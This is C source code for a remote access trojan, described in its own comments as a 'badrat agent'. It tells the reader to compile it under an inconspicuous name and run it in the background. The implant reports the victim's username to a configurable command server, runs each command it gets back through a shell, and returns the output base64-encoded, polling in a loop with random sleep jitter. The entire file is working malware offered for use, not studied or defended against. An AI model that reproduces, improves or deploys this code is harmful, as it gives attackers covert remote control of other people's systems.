//very janky badrat agent written for a buddy and also to jog my memory on writing c code
//
//Instructions:
//>>To compile: gcc rat.c -ljson-c -lcurl -lresolv -o somethingInconspicuous
//>>Run like any old binary: ./somethingInconspicuous &

#include<stdio.h>
#include<stdlib.h>
#include<json-c/json.h>
#include <curl/curl.h>
#include<string.h>
#include<resolv.h>
#include<unistd.h>

#define SIZE 4096


//modify URL string to point at your server x.x.x.x:8080/anything can go here
char URL[] = "http://localhost:8080/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";

struct MemoryStruct{
	char *memory;
	size_t size;
};


static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
	  size_t realsize = size * nmemb;
	    struct MemoryStruct *mem = (struct MemoryStruct *)userp;
	     
	      char *ptr = (char*)realloc(mem->memory, mem->size + realsize + 1);
	        if(!ptr) {
			    /* out of memory! */ 
			    printf("not enough memory (realloc returned NULL)\n");
			        return 0;
				  }
		 
		  mem->memory = ptr;
		    memcpy(&(mem->memory[mem->size]), contents, realsize);
		      mem->size += realsize;
		        mem->memory[mem->size] = 0;
			 
			  return realsize;
}

//Creates curl object posts json, and parses the return data as cmd input
//Example object:
//{"type": "c", "id": "randint", "un": "haxx0r", [if output] "retval": "command return"}
char* Ratify(char *cmndout, int size, int ident){
	CURL *curl = curl_easy_init();
	CURLcode res;
	
	char* rawjson;

	char *username = malloc(SIZE);
        getlogin_r(username, SIZE);	
	
	int outLength = size*2;
	char *outBuffer = malloc(SIZE * 2);
	*outBuffer = ' ';
	b64_ntop(cmndout, size-1, outBuffer, SIZE * 2);
	struct MemoryStruct chunk;
	chunk.memory = (char*)malloc(1);
	chunk.size = 0;
	json_object *parsed_json;
	json_object *cmnd;
	json_object *jobj = json_object_new_object();
	json_object *type = json_object_new_string("c");
	json_object *id = json_object_new_int(ident);
	json_object *un = json_object_new_string(username);

	json_object_object_add(jobj,"type", type);
	json_object_object_add(jobj, "id", id);
	json_object_object_add(jobj, "un", un);
	if(size){
		json_object *retval = json_object_new_string(outBuffer);
		json_object_object_add(jobj, "retval", retval);
	}

	struct curl_slist *headers = NULL;
	headers = curl_slist_append(headers, "Expect:");
	headers = curl_slist_append(headers, "Content-Type: application/json");
	if(!curl) {
		fprintf(stderr, "Error: init of curl object failed.");
		curl_easy_cleanup(curl);
		return -1;
	}
	if(curl){
		int len;
		len = sizeof(json_object_to_json_string(jobj));
		curl_easy_setopt(curl, CURLOPT_URL, URL);
		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_object_to_json_string(jobj));
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
		res = curl_easy_perform(curl);
		if(res !=CURLE_OK)
			fprintf(stderr, "curl_easy_perform() failed %s\n", curl_easy_strerror(res));
		rawjson = chunk.memory;
		char *start = rawjson;
		char *end = rawjson;
		while(*rawjson) {
		
		//parse command output to a json object	
		if(*rawjson == '{') start = rawjson;
		else if(*rawjson == '}') end = rawjson+1;
			if(start < end && *start) {
				*end = 0;
			}
			rawjson++;
    		}
		parsed_json = json_tokener_parse(start);
		json_object_object_get_ex(parsed_json, "cmnd", &cmnd);
		free(chunk.memory);
		curl_easy_cleanup(curl);
		return(json_object_get_string(cmnd));
	}
}

//pre: uses popen to fork a child process and create a pipe
//post: returns the output of the command run
int doTheStuff(char *stuff, char* resp){
	FILE *fp;	//pipe filepointer
	char *result = malloc(sizeof(char) * SIZE);
	char *res = result;
	int status;
	int charcount = 0;
	char *sterr = " 2>&1";
	strcat(stuff, sterr);	//append redirect of stderr so terminal doesn't output error messages
	
	fp = popen(stuff, "r");
	while(feof(fp) != 1){
		*result++ = fgetc(fp);
		charcount++;
	}
	status = pclose(fp);
	strcpy(resp, res);
	return charcount;
}


int main(){
//Well it aint puuuurrrrty but it works.

	int ident = rand() % 9999999;
	char *prevcmnd = malloc(SIZE);
	char *retval = malloc(sizeof(char) * SIZE);
	char *stuff = malloc(SIZE);			//cmnd issued to rat
	int randint = 3;				//jitter
	int size = 0;
	while(1){
		size =  0;
		*retval = ' ';
		stuff = Ratify(retval,size, ident);
		if(stuff != NULL && strcmp(prevcmnd, stuff) != 0){
			size = doTheStuff(stuff, retval);
		}
		if (*retval != ' ' && strcmp(prevcmnd, stuff) != 0)
			stuff = Ratify(retval, size, ident);
		strcpy(prevcmnd, stuff);
		while(randint < 3)
		       randint = rand() % 7;	
	
		sleep(randint);
		}
	}
